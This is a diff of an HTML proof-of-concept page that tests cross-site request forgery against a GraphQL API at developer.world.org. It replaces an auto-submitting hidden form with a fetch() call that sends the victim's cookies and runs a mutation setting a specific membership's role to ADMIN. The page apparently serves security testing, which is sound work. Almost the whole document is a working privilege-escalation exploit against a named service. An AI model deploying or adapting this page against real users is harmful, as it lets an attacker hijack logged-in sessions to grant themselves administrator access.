@@ -1,5 +1,42 @@
-<form action="https://developer.world.org/api/v1/graphql" method="POST">
-  <input type="hidden" name="query" value="mutation GeneratedOperation($_set: membership_set_input, $pk_columns: membership_pk_columns_input!) { update_membership_by_pk(_set: $_set, pk_columns: $pk_columns) { id role } }">
-  <input type="hidden" name="variables" value='{"_set":{"role":"MEMBER"},"pk_columns":{"id":"memb_90936877a6f3f595340378dfbbd486dc"}}'>
-</form>
-<script>document.forms[0].submit();</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>GraphQL CSRF Test</title>
+</head>
+<body>
+  <h1>Testing CSRF via fetch()</h1>
+
+  <script>
+    fetch("https://developer.world.org/api/v1/graphql", {
+      method: "POST",
+      credentials: "include", // forces cookies to be sent
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        query: `mutation GeneratedOperation($_set: membership_set_input, $pk_columns: membership_pk_columns_input!) {
+          update_membership_by_pk(_set: $_set, pk_columns: $pk_columns) {
+            id
+            role
+          }
+        }`,
+        variables: {
+          _set: { role: "ADMIN" },
+          pk_columns: { id: "memb_90936877a6f3f595340378dfbbd486dc" }
+        }
+      })
+    })
+    .then(r => r.text())
+    .then(t => {
+      console.log("Response:", t);
+      document.body.innerHTML += "<pre>" + t + "</pre>";
+    })
+    .catch(e => {
+      console.error("Error:", e);
+      document.body.innerHTML += "<pre>Error: " + e + "</pre>";
+    });
+  </script>
+
+</body>
+</html>
+
